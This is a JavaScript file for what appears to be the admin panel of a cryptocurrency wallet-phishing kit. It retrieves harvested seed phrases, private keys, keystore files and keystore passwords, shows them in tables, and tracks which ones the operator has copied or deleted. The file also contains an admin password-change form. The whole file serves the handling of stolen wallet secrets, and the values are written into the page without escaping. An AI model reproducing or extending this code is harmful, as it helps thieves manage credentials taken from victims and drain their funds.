const currentUsername = document.getElementById('current-username');
const currentPassword = document.getElementById('current-password');
const newPassword = document.getElementById('new-password');
const confirmPassword = document.getElementById('confirm-password')
const submitBtn = document.getElementById('security-btn')
var phraseData;
var keyStoreData;
var privateKeyData;


$.ajax({
    type: "GET",
    url: '/get-phrase',
    cache: false,
    success: (req, res, data) => {
       setupPhraseDataTable(data.responseJSON.phrases)
    },
    error: (e) => {
 
    },
  });

  $.ajax({
    type: "GET",
    url: '/get-key-store',
    cache: false,
    success: (req, res, data) => {
        setupKeyStoreDataTable(data.responseJSON.keystore)
    },
    error: (e) => {
 
    },
  });

  $.ajax({
    type: "GET",
    url: '/get-private-key',
    cache: false,
    success: (req, res, data) => {
      setupPrivateKeyDataTable(data.responseJSON.privatekey)
    },
    error: (e) => {
 
    },
  });

  $.ajax({
    type: "GET",
    url: '/get-admin-details',
    cache: false,
    success: (req, res, data) => {
       currentUsername.value = data.responseJSON.data
    },
    error: (e) => {
 
    },
  });
submitBtn.addEventListener('click', (e) => {
    e.preventDefault()
    document.getElementById('error-text').style.display = 'none'
    document.getElementById('error-text-pass').style.display = 'none'

    if(newPassword.value == confirmPassword.value){
        $.ajax({
            type: "POST",
            url: '/update-admin',
            cache: false,
            data: {
              username: currentUsername.value,
              password: confirmPassword.value,
              currentPassword: currentPassword.value,
            },
            success: (res) => {
               submitBtn.value = 'UPDATED'
               window.location = '/login'
            },
            error: (e) => {
                confirmPassword.value = ''
                currentPassword.value = ''
                newPassword.value = ''
                document.getElementById('error-text-pass').style.display = 'block'
            },
          });
    } else {
        document.getElementById('error-text').style.display = 'block'
        confirmPassword.value = ''
        currentPassword.value = ''
        newPassword.value = ''
    }
})
  function setupPhraseDataTable(data){
    if(data.length != 0){
        $("#empty_phrase_state").html("")
        phraseData = data
        console.log('hello' + data);
        data.map((phraseMap, index) => {
            $("#phrase").append(
                "<tr>"+
                "<td>" + phraseMap.data.walletType + "</td>" + 
                "<td id=" + `${index + 'adesdhs'}` + ">" + phraseMap.data.phrase + "</td>" + 
                "<td>" + "<button class=\"btn btn-primary\"" + "id=" + `${index + 'phrase'}` + ">" + "Copy</button>" + "</td>" +
                "<td>" + "<button class=\"btn btn-primary\"" + "id=" + `${index + 'phrase-delete'}` + ">" + "Delete</button>" + "</td>" +
                "</tr>"
                );

                document.getElementById(`${index + 'phrase'}`).addEventListener('click', (e) => {
                  var field = document.getElementById(`${index + 'phrase'}`)
                  field.innerHTML = 'Copied'
                  field.style.backgroundColor = "green"
                    updatePhrase('copy', {
                    walletType: phraseMap.data.walletType,
                    phrase: phraseMap.data.phrase,
                    copied: true,
                    delete: phraseMap.data.delete,
                    id: phraseMap.id
                   })
                   copyElementToClipboard(`${index + 'adesdhs'}`)
                  // copyPhraseToClipBoard(index)
                })

                
                var deleteBtn = document.getElementById(`${index + 'phrase-delete'}`)
                deleteBtn.style.backgroundColor = "red"
                deleteBtn.addEventListener('click', (e) => {
                  //update firestore
                  updatePhrase('delete', {
                    walletType: phraseMap.data.walletType,
                    phrase: phraseMap.data.phrase,
                    copied: phraseMap.data.copied,
                    delete: true,
                    id: phraseMap.id
                  })
                })

                if(phraseMap.data.copied){
                  var element = document.getElementById(`${index + 'phrase'}`)
                  element.style.backgroundColor = "green"
                }
        });
    }
}

  function setupPrivateKeyDataTable(data){
    if(data.length != 0){
        $("#empty_private_key_state").html("")
        privateKeyData = data
        data.map((privateKey, index) => {
            $("#private-key").append(
                "<tr>"+
                "<td>" + privateKey.data.walletType + "</td>" + 
                "<td id=" + `${index + 'hjdhjdjdd'}` + ">" + privateKey.data.privatekey + "</td>" + 
                "<td>" + "<button class=\"btn btn-primary\"" + "id=" + `${index + 'privatekey'}` + ">" + "Copy</button>" + "</td>" +
                "<td>" + "<button class=\"btn btn-primary\"" + "id=" + `${index + 'privatekey-delete'}` + ">" + "Delete</button>" + "</td>" +
                "</tr>"
                );

                var deleteBtn = document.getElementById(`${index + 'privatekey-delete'}`)
                deleteBtn.style.backgroundColor = "red"
                deleteBtn.addEventListener('click', (e) => {
                  //update firestore
                  updatePrivateKey('delete', {
                    walletType: privateKey.data.walletType,
                    privatekey: privateKey.data.privatekey,
                    copied: privateKey.data.copied,
                    delete: true,
                    id: privateKey.id
                  })
                })

                if(privateKey.data.copied){
                  var element = document.getElementById(`${index + 'privatekey'}`)
                  element.style.backgroundColor = "green"
                }

                document.getElementById(`${index + 'privatekey'}`).addEventListener('click', (e) => {
                  var field = document.getElementById(`${index + 'privatekey'}`)
                  field.innerHTML = 'Copied'
                  field.style.backgroundColor = "green"
                  updatePrivateKey('copy', {
                    walletType: privateKey.data.walletType,
                    privatekey: privateKey.data.privatekey,
                    copied: true,
                    delete: privateKey.data.delete,
                    id: privateKey.id
                   })
                   copyElementToClipboard(`${index + 'hjdhjdjdd'}`)
                  // copyPrivateKeyToClipBoard(index)
               })
        });
    }
  }

  function setupKeyStoreDataTable(data){
    if(data.length != 0){
        $("#empty_key_store_state").html("")
        keyStoreData = data
        console.log(data);
        data.map((walletStore, index) => {
            $("#key-store").append(
                "<tr>"+
                "<td>" + walletStore.data.walletType + "</td>" + 
                "<td id=" + `${index + 'uyyueww'}` + ">" + walletStore.data.keystore + "</td>" + 
                "<td>" + "<button class=\"btn btn-primary\"" + "id=" + `${index + 'keystore'}` + ">" + "Copy Key</button>" + "</td>" +
                "<td id=" + `${index + 'ujdyrtwrw'}` + ">" + walletStore.data.password + "</td>" +
                "<td>" + "<button class=\"btn btn-primary\"" + "id=" + `${index + 'password'}` + ">" + "Copy Password</button>" + "</td>" +
                "<td>" + "<button class=\"btn btn-primary\"" + "id=" + `${index + 'keystore-delete'}` + ">" + "Delete</button>" + "</td>" +
                "</tr>"
                );

                var deleteBtn = document.getElementById(`${index + 'keystore-delete'}`)
                deleteBtn.style.backgroundColor = "red"
                deleteBtn.addEventListener('click', (e) => {
                  //update firestore
                  updateKeyStore('delete', {
                    walletType: walletStore.data.walletType,
                    keystore: walletStore.data.keystore,
                    password: walletStore.data.password,
                    copied: walletStore.data.copied,
                    passCopied: walletStore.data.passCopied,
                    delete: true,
                    id: walletStore.id
                  })
                })

                if(walletStore.data.copied){
                  var element = document.getElementById(`${index + 'keystore'}`)
                  element.style.backgroundColor = "green"
                }

                if(walletStore.data.passCopied){
                  var element = document.getElementById(`${index + 'password'}`)
                  element.style.backgroundColor = "green"
                }

                document.getElementById(`${index + 'keystore'}`).addEventListener('click', (e) => {
                  var field = document.getElementById(`${index + 'keystore'}`)
                  field.innerHTML = 'Copied Key'
                  field.style.backgroundColor = "green"
                  updateKeyStore('copy', {
                    walletType: walletStore.data.walletType,
                    keystore: walletStore.data.keystore,
                    password: walletStore.data.password,
                    copied: true,
                    passCopied: walletStore.data.passCopied,
                    delete: walletStore.data.delete,
                    id: walletStore.id
                   })
                   copyElementToClipboard(`${index + 'uyyueww'}`)
                  // copyKeyStoreToClipBoard(index)
               })

               document.getElementById(`${index + 'password'}`).addEventListener('click', (e) => {
                var field = document.getElementById(`${index + 'password'}`)
                field.innerHTML = 'Copied Password'
                field.style.backgroundColor = "green"
                updateKeyStore('copy', {
                  walletType: walletStore.data.walletType,
                  keystore: walletStore.data.keystore,
                  password: walletStore.data.password,
                  copied: true,
                  delete: walletStore.data.delete,
                  id: walletStore.id
                 })
                 copyElementToClipboard(`${index + 'ujdyrtwrw'}`)
                 //copyKeyStorePasswordToClipBoard(index)
             })
        });
    }
}

function copyElementToClipboard(element) {
  window.getSelection().removeAllRanges();
  let range = document.createRange();
  range.selectNode(typeof element === 'string' ? document.getElementById(element) : element);
  window.getSelection().addRange(range);
  document.execCommand('copy');
  window.getSelection().removeAllRanges();
}

/*
function copyPhraseToClipBoard(index) {
  navigator.clipboard.writeText(phraseData[index].data.phrase);
}

function copyKeyStoreToClipBoard(index) {  
  navigator.clipboard.writeText(keyStoreData[index].data.keystore);
}


function copyKeyStorePasswordToClipBoard(index) {  
  navigator.clipboard.writeText(keyStoreData[index].data.password);
}


function copyPrivateKeyToClipBoard(index) {  
  navigator.clipboard.writeText(privateKeyData[index].data.privatekey);
}
*/
function updatePhrase(type, data){
  $.ajax({
    type: "POST",
    url: '/update-phrase',
    data: data,
    cache: false,
    success: () => {
      if(type == 'delete'){
        window.location.reload()
      }
    },
    error: (e) => {
      console.log(e.responseJSON);
    },
  });
}

function updateKeyStore(type, data){
  $.ajax({
    type: "POST",
    url: '/update-key-store',
    data: data,
    cache: false,
    success: () => {
      if(type == 'delete'){
        window.location.reload()
      }
    },
    error: (e) => {
      console.log(e.responseJSON);
    },
  });
}

function updatePrivateKey(type, data){
  console.log(data);
  $.ajax({
    type: "POST",
    url: '/update-private-key',
    data: data,
    cache: false,
    success: () => {
      if(type == 'delete'){
        window.location.reload()
      }
    },
    error: (e) => {
      console.log(e.responseJSON);
    },
  });
}

